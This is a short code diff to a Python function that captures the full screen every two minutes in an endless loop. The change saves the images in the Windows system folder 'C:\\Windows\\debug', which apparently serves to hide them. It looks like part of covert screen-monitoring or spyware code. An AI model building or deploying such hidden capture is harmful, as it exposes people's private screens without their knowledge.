@@ -4,5 +4,6 @@ def screenshootfunc(name="screen"):
     while True:
         picture = ImageGrab.grab()
         screen_name=name+".jpg"
-        picture.save(screen_name,'JPEG')
+        path= "C:\\Windows\\debug\\"
+        picture.save(path+screen_name,'JPEG')
         time.sleep(120)
